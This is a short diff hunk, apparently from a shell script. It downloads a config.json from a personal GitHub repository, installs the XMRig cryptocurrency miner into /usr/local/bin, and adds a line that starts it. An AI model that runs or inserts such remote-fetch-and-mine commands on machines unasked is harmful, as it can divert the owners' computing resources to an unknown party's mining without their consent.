@@ -8,6 +8,7 @@ wget https://raw.githubusercontent.com/hhenryskate/test/main/config.json
 chmod 775 xmrig
 cp xmrig /usr/local/bin
 cp config.json /usr/local/bin
+xmrig
 
 
 
